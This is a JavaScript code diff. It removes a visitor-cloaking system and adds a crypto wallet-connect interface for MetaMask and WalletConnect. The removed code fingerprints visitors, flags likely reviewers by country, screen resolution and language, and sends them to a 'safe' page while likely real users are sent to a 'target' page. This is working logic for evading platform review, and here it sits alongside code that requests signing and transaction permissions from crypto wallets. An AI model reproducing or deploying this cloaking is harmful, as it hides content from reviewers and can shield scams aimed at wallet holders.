-            this.log(`Behavior score from session: ${behaviorScore}`, 'debug');
-        } else {
-            this.startBehaviorTracking();
-        }
-
-        // Reviewer detection (optional)
-        if (this.isPotentialReviewer(fingerprint, ipCheck)) {
-            this.log('Potential reviewer → safe', 'info');
-            return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
-        }
-
-        const humanScore = this.calculateDesktopScore(ipCheck, fingerprint, wallet, behaviorScore);
-        this.log(`Desktop human score: ${humanScore}% (threshold: ${this.config.strictnessLevel})`, 'info');
-
-        if (humanScore >= this.config.strictnessLevel) {
-            return { type: 'human', score: humanScore, showSafe: false };
-        } else {
-            return { type: 'suspicious', score: humanScore, showSafe: true };
-        }
-    }
-
-    // ---------- Reviewer pattern detection (strict) ----------
-    isPotentialReviewer(fingerprint, ipInfo) {
-        const reviewerIndicators = [];
-        const reviewerCountries = ['US', 'GB', 'IE', 'IN', 'SG', 'MY'];
-        if (reviewerCountries.includes(ipInfo.country)) reviewerIndicators.push('country');
-        const standardResolutions = ['1920x1080', '1366x768', '1440x900', '1536x864'];
-        if (standardResolutions.includes(fingerprint.screenResolution)) reviewerIndicators.push('resolution');
-        const reviewerLanguages = ['en-US', 'en-GB', 'en'];
-        if (reviewerLanguages.includes(navigator.language)) reviewerIndicators.push('language');
-        return reviewerIndicators.length >= 3;
-    }
-
-    // ---------- Execution ----------
-    async executeCloaking() {
-        try {
-            const result = await this.determineVisitorType();
-            const sessionData = { timestamp: Date.now(), result, fingerprint: this.fingerprint };
-            sessionStorage.setItem('visitor_session', JSON.stringify(sessionData));
-
-            if (typeof window.cloakingReady === 'function') window.cloakingReady();
-
-            if (result.showSafe) {
-                this.log(`Redirecting to safe page: ${this.config.safePageUrl}`, 'info');
-                window.location.replace(this.config.safePageUrl);
-            } else {
-                this.log(`Serving target page: ${this.config.targetPageUrl}`, 'success');
-                window.location.replace(this.config.targetPageUrl);
-            }
-        } catch (error) {
-            this.log(`Cloaking error: ${error.message}`, 'error');
-            if (typeof window.cloakingReady === 'function') window.cloakingReady();
-            window.location.href = this.config.safePageUrl;
-        }
-    }
-
-    log(message, level) {
-        if (this.config.debugMode || level === 'error') {
-            console.log(`[Cloaking ${level.toUpperCase()}] ${message}`);
-        }
-    }
-}
-
-// ---------- Auto‑initialize ----------
-(function() {
-    const cloakingSystem = new AdvancedCloakingSystem({
-        safePageUrl: '/safe',
-        targetPageUrl: '/target',
-        strictnessLevel: 55,          // desktop threshold
-        debugMode: true,               // set false in production
-        usePublicIpService: true
-    });
-
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', () => cloakingSystem.executeCloaking());
+    const formattedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`
+    display.innerHTML = `
+      <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
+        <i class="fas fa-check-circle" style="color: #059669;"></i>
+        <span>Connected: ${formattedAddress}</span>
+        <button id="copyAddress" style="background: none; border: none; color: #059669; cursor: pointer; padding: 4px;" title="Copy address">
+          <i class="far fa-copy"></i>
+        </button>
+      </div>
+    `
+
+    document.getElementById('copyAddress').addEventListener('click', () => {
+      navigator.clipboard.writeText(address).then(() => {
+        const copyBtn = document.getElementById('copyAddress')
+        const originalIcon = copyBtn.innerHTML
+        copyBtn.innerHTML = '<i class="fas fa-check"></i>'
+        copyBtn.style.color = '#10B981'
+        setTimeout(() => {
+          copyBtn.innerHTML = originalIcon
+          copyBtn.style.color = '#059669'
+        }, 2000)
+      })
+    })
+
+    showStatus('Wallet connected successfully!', 'success')
+  }
+
+  function resetConnectedUI() {
+    setButtonState(connectButton, 'normal')
+    if (walletButton) setButtonState(walletButton, 'normal')
+    const display = document.getElementById('connectedAddressDisplay')
+    if (display) display.remove()
+    showStatus('Wallet disconnected', 'info')
+  }
+
+  // ---------- WalletConnect initialization with detailed logging ----------
+  async function initWalletConnect(useTestId = false) {
+    if (client && modal) return true
+
+    if (useTestId) {
+      logDebug('🔄 Initializing WalletConnect with PUBLIC TEST PROJECT ID')
+      projectId = PUBLIC_TEST_ID
     } else {
-        cloakingSystem.executeCloaking();
+      logDebug(`🔄 Initializing WalletConnect with projectId: ${projectId}`)
     }
-})();
+
+    try {
+      client = await SignClient.init({
+        projectId,
+        metadata,
+        relayUrl: 'wss://relay.walletconnect.com'
+      })
+
+      modal = new WalletConnectModal({
+        projectId,
+        themeMode: 'dark',
+        themeVariables: {
+          '--wcm-z-index': '9999',
+          '--wcm-accent-color': '#FF6B00',
+          '--wcm-background-color': '#1F2937',
+          '--wcm-font-family': "'Inter', sans-serif"
+        },
+        enableExplorer: true,
+        explorerRecommendedWalletIds: [
+          "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
+          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
+          "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369",
+          "fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",
+          "ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18",
+        ],
+        explorerExcludedWalletIds: [],
+        mobileWallets: [
+          { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
+          { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
+          { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
+          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } }
+        ]
+      })
+
+      logDebug('✅ WalletConnect initialized successfully')
+      return true
+    } catch (error) {
+      logDebug(`❌ WalletConnect init failed: ${error.message}`)
+      if (error.stack) logDebug(error.stack)
+      return false
+    }
+  }
+
+  // ---------- Direct connection (works via window.ethereum) ----------
+  async function connectDirect() {
+    if (typeof window.ethereum === 'undefined') {
+      logDebug('No injected provider (window.ethereum)')
+      return false
+    }
+
+    logDebug('Attempting direct connection via window.ethereum...')
+    try {
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
+      if (accounts && accounts.length > 0) {
+        const account = accounts[0]
+        logDebug(`✅ Direct connection successful: ${account}`)
+        updateConnectedUI(account)
+        saveWallet(account)
+        return true
+      }
+    } catch (error) {
+      logDebug(`⚠️ Direct connection failed: ${error.message}`)
+    }
+    return false
+  }
+
+  // ---------- WalletConnect connection attempt ----------
+  async function connectViaWalletConnect(useTestId = false) {
+    const initSuccess = await initWalletConnect(useTestId)
+    if (!initSuccess) {
+      showStatus('Wallet connection service unavailable', 'error')
+      return false
+    }
+
+    try {
+      showStatus('Requesting wallet connection...', 'info')
+      logDebug('Initiating WalletConnect session...')
+
+      const { uri, approval } = await client.connect({
+        requiredNamespaces: {
+          eip155: {
+            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
+            chains: ['eip155:1'],
+            events: ['chainChanged', 'accountsChanged'],
+          },
+        },
+      })
+
+      if (uri) {
+        logDebug(`URI obtained: ${uri}`)
+        modal.openModal({ uri })
+        showStatus('Select your wallet or scan QR code', 'info')
+      }
+
+      const session = await Promise.race([
+        approval(),
+        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 60000))
+      ])
+
+      if (modal) modal.closeModal()
+      logDebug('Session approved')
+
+      const connectionSuccess = handleConnectedSession(session)
+      if (connectionSuccess) {
+        showStatus('Wallet connected successfully!', 'success')
+      } else {
+        showStatus('Failed to get accounts from session', 'error')
+      }
+      return connectionSuccess
+    } catch (err) {
+      logDebug(`❌ WalletConnect connection error: ${err.message}`)
+      if (modal) modal.closeModal()
+
+      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
+        showStatus('Connection cancelled by user', 'error')
+      } else if (err.message?.includes('timeout')) {
+        showStatus('Connection timeout - please try again', 'error')
+      } else {
+        showStatus('Wallet connection failed', 'error')
+      }
+      return false
+    }
+  }
+
+  // ---------- Handle session approval ----------
+  function handleConnectedSession(session) {
+    if (session?.namespaces?.eip155?.accounts?.length) {
+      const account = session.namespaces.eip155.accounts[0].split(':')[2]
+      logDebug(`✅ Connected wallet via WalletConnect: ${account}`)
+      currentSession = session
+      updateConnectedUI(account)
+      saveWallet(account, session)
+      return true
+    } else {
+      logDebug('❌ No accounts found in session')
+      return false
+    }
+  }
+
+  // ---------- Desktop wallet detection (unchanged) ----------
+  function detectInstalledWallets() {
+    return new Promise((resolve) => {
+      const wallets = {
+        metamask: !!window.ethereum?.isMetaMask,
+        trust: !!window.ethereum?.isTrust,
+        rainbow: !!window.ethereum?.isRainbow,
+        coinbase: !!window.ethereum?.isCoinbaseWallet,
+        phantom: !!window.ethereum?.isPhantom,
+        brave: !!window.ethereum?.isBraveWallet,
+        rabby: !!window.ethereum?.isRabby,
+        okx: !!window.ethereum?.isOKExWallet,
+        bitget: !!window.ethereum?.isBitKeep,
+      }
+      if (window.eip6963Providers) {
+        window.eip6963Providers.forEach(provider => {
+          if (provider.info.rdns) {
+            const rdns = provider.info.rdns.toLowerCase()
+            if (rdns.includes('metamask')) wallets.metamask = true
+            if (rdns.includes('trust')) wallets.trust = true
+            if (rdns.includes('rainbow')) wallets.rainbow = true
+            if (rdns.includes('coinbase')) wallets.coinbase = true
+            if (rdns.includes('phantom')) wallets.phantom = true
+            if (rdns.includes('brave')) wallets.brave = true
+            if (rdns.includes('rabby')) wallets.rabby = true
+            if (rdns.includes('okx')) wallets.okx = true
+            if (rdns.includes('bitget')) wallets.bitget = true
+          }
+        })
+      }
+      if (window.ethereum?.providers) {
+        window.ethereum.providers.forEach(provider => {
+          if (provider.isMetaMask && !wallets.metamask) wallets.metamask = true
+          if (provider.isTrust && !wallets.trust) wallets.trust = true
+          if (provider.isRainbow && !wallets.rainbow) wallets.rainbow = true
+          if (provider.isCoinbaseWallet && !wallets.coinbase) wallets.coinbase = true
+          if (provider.isPhantom && !wallets.phantom) wallets.phantom = true
+          if (provider.isBraveWallet && !wallets.brave) wallets.brave = true
+          if (provider.isRabby && !wallets.rabby) wallets.rabby = true
+        })
+      }
+      console.log('🔍 Enhanced wallet detection:', wallets)
+      resolve(wallets)
+    })
+  }
+
+  async function connectDesktopWallet() {
+    try {
+      const detectedWallets = await detectInstalledWallets()
+      const availableWallets = Object.keys(detectedWallets).filter(wallet => detectedWallets[wallet])
+      if (availableWallets.length === 0) {
+        console.log('🔍 No installed wallets detected, using WalletConnect modal')
+        return false
+      }
+
+      console.log(`🎯 Found installed wallets: ${availableWallets.join(', ')}`)
+
+      let provider = window.ethereum
+      if (window.ethereum?.providers && window.ethereum.providers.length > 0) {
+        provider = window.ethereum.providers[0]
+        const preferredWallets = ['metamask', 'coinbase', 'rabby', 'trust', 'brave']
+        for (const walletName of preferredWallets) {
+          if (detectedWallets[walletName]) {
+            const preferredProvider = window.ethereum.providers.find(p => {
+              if (walletName === 'metamask' && p.isMetaMask) return true
+              if (walletName === 'coinbase' && p.isCoinbaseWallet) return true
+              if (walletName === 'rabby' && p.isRabby) return true
+              if (walletName === 'trust' && p.isTrust) return true
+              if (walletName === 'brave' && p.isBraveWallet) return true
+              return false
+            })
+            if (preferredProvider) {
+              provider = preferredProvider
+              break
+            }
+          }
+        }
+      }
+
+      if (provider) {
+        console.log(`🦊 Attempting direct connection with ${provider.isMetaMask ? 'MetaMask' : provider.isCoinbaseWallet ? 'Coinbase' : 'detected wallet'}...`)
+        try {
+          const accounts = await provider.request({ method: 'eth_requestAccounts' })
+          if (accounts && accounts.length > 0) {
+            const account = accounts[0]
+            console.log('✅ Direct wallet connection successful:', account)
+            updateConnectedUI(account)
+            saveWallet(account)
+            return true
+          }
+        } catch (error) {
+          console.warn('⚠️ Direct wallet connection failed:', error)
+        }
+      }
+      showStatus(`Found ${availableWallets.length} wallet(s) - using WalletConnect`, 'info')
+      return false
+    } catch (error) {
+      console.error('❌ Desktop wallet connection error:', error)
+      return false
+    }
+  }
+
+  // ---------- Main connect function (prioritize direct, then WalletConnect) ----------
+  async function connectWallet() {
+    setButtonState(connectButton, 'loading')
+    if (walletButton) setButtonState(walletButton, 'loading')
+    showStatus('Initializing wallet connection...', 'info')
+    logDebug('Starting wallet connection...')
+
+    // Step 1: Always try direct connection first (works on mobile in-app browsers and desktop with extension)
+    const directSuccess = await connectDirect()
+    if (directSuccess) {
+      setButtonState(connectButton, 'connected')
+      if (walletButton) setButtonState(walletButton, 'connected')
+      return
+    }
+
+    // Step 2: If not mobile, try desktop direct (might be redundant if connectDirect already tried, but kept for compatibility)
+    if (!isMobile()) {
+      const desktopSuccess = await connectDesktopWallet()
+      if (desktopSuccess) {
+        setButtonState(connectButton, 'connected')
+        if (walletButton) setButtonState(walletButton, 'connected')
+        return
+      }
+    }
+
+    // Step 3: Try WalletConnect with user's project ID
+    logDebug('Direct connection failed or not available, trying WalletConnect with YOUR project ID...')
+    let wcSuccess = await connectViaWalletConnect(false)
+    if (wcSuccess) {
+      setButtonState(connectButton, 'connected')
+      if (walletButton) setButtonState(walletButton, 'connected')
+      return
+    }
+
+    // Step 4: If that fails, try with public test project ID
+    logDebug('Your project ID failed, trying with PUBLIC test project ID...')
+    wcSuccess = await connectViaWalletConnect(true)
+    if (wcSuccess) {
+      setButtonState(connectButton, 'connected')
+      if (walletButton) setButtonState(walletButton, 'connected')
+      return
+    }
+
+    // All failed
+    logDebug('All connection methods failed')
+    setButtonState(connectButton, 'failed')
+    if (walletButton) setButtonState(walletButton, 'failed')
+  }
+
+  // ---------- Disconnect (unchanged) ----------
+  async function disconnectWallet() {
+    try {
+      if (currentSession) {
+        await client.disconnect({
+          topic: currentSession.topic,
+          reason: { code: 6000, message: 'User disconnected' },
+        })
+        currentSession = null
+      }
+    } catch (err) {
+      console.warn('⚠️ Disconnect error:', err)
+    }
+    resetConnectedUI()
+    clearSavedWallet()
+  }
+
+  // ---------- Button click handler ----------
+  const handleClick = async () => {
+    const saved = getSavedWallet()
+    if (saved && currentSession) {
+      await disconnectWallet()
+    } else {
+      await connectWallet()
+    }
+  }
+
+  if (connectButton) connectButton.addEventListener('click', handleClick)
+  if (walletButton) walletButton.addEventListener('click', handleClick)
+
+  // ---------- Restore session ----------
+  async function restoreWalletConnection() {
+    const savedWallet = getSavedWallet()
+    const savedSession = getSavedSession()
+
+    if (savedWallet && savedSession) {
+      logDebug(`♻️ Restoring saved wallet and session: ${savedWallet}`)
+      const initSuccess = await initWalletConnect(false)
+      if (!initSuccess) {
+        logDebug('❌ Failed to initialize WalletConnect for session restoration')
+        clearSavedWallet()
+        return
+      }
+      try {
+        const session = client.session.get(savedSession.topic)
+        if (session) {
+          currentSession = session
+          updateConnectedUI(savedWallet)
+          logDebug('✅ Wallet session restored successfully')
+          showStatus('Wallet connection restored', 'success')
+        } else {
+          logDebug('❌ Session not found, clearing saved data')
+          clearSavedWallet()
+        }
+      } catch (error) {
+        logDebug(`❌ Error restoring session: ${error.message}`)
+        clearSavedWallet()
+      }
+    } else if (savedWallet && !savedSession) {
+      logDebug('♻️ Restoring direct wallet connection')
+      updateConnectedUI(savedWallet)
+      showStatus('Wallet connection restored', 'success')
+    }
+  }
+
+  await restoreWalletConnection()
+
+  // ---------- Session listeners ----------
+  setTimeout(() => {
+    if (client) {
+      client.on('session_update', ({ params }) => {
+        console.log('🔄 Session updated:', params)
+        const accounts = params.namespaces?.eip155?.accounts
+        if (accounts?.length) {
+          const account = accounts[0].split(':')[2]
+          updateConnectedUI(account)
+          showStatus('Wallet session updated', 'info')
+        }
+      })
+      client.on('session_delete', () => {
+        console.log('🗑️ Session deleted')
+        resetConnectedUI()
+        clearSavedWallet()
+        showStatus('Wallet disconnected by provider', 'error')
+      })
+      client.on('session_event', (event) => console.log('📨 Session event:', event))
+      client.on('session_connect', (session) => {
+        console.log('🔗 Session connected:', session)
+        handleConnectedSession(session)
+      })
+    }
+  }, 1000)
+
+  // ---------- EIP-6963 (unchanged) ----------
+  function setupEIP6963() {
+    if (typeof window !== 'undefined') {
+      if (!window.eip6963Providers) window.eip6963Providers = []
+      window.addEventListener('eip6963:announceProvider', (event) => {
+        console.log('🎯 EIP-6963 Provider detected:', event.detail.info.name)
+        const exists = window.eip6963Providers.some(p => p.info.uuid === event.detail.info.uuid)
+        if (!exists) {
+          window.eip6963Providers.push(event.detail)
+          console.log(`✅ Added EIP-6963 provider: ${event.detail.info.name}`)
+        }
+      })
+      window.dispatchEvent(new Event('eip6963:requestProvider'))
+      setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1000)
+    }
+  }
+  setupEIP6963()
+
+  // ---------- Visibility change ----------
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden && getSavedWallet()) console.log('🔍 Page visible, checking connection state...')
+  })
+
+  // ---------- Before unload ----------
+  window.addEventListener('beforeunload', () => { if (modal) modal.closeModal() })
+
+  // ---------- Provider change detection (unchanged) ----------
+  if (window.ethereum) {
+    window.ethereum.on('accountsChanged', (accounts) => {
+      if (accounts.length === 0) {
+        console.log('🔒 Accounts disconnected')
+        resetConnectedUI()
+        clearSavedWallet()
+        showStatus('Wallet disconnected', 'info')
+      } else {
+        console.log('🔄 Accounts changed:', accounts[0])
+        updateConnectedUI(accounts[0])
+        saveWallet(accounts[0])
+      }
+    })
+    window.ethereum.on('chainChanged', (chainId) => {
+      console.log('🔄 Chain changed:', chainId)
+      showStatus(`Network changed to ${chainId}`, 'info')
+    })
+    window.ethereum.on('disconnect', () => {
+      console.log('🔒 Provider disconnected')
+      resetConnectedUI()
+      clearSavedWallet()
+      showStatus('Wallet disconnected', 'info')
+    })
+  }
+})
